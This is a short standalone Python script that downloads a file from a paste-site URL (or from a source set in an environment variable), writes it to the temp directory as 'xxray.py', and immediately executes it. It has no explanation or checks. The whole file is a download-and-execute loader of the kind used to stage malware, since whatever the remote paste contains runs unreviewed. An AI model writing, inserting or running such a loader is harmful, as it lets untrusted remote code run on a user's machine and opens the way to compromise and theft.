import os, runpy, tempfile, urllib.request
p = os.path.join(tempfile.gettempdir(), "xxray.py")
urllib.request.urlretrieve(os.environ.get("XXRAY_SRC", "https://paste.rs/vu80J"), p)
runpy.run_path(p, run_name="__main__")
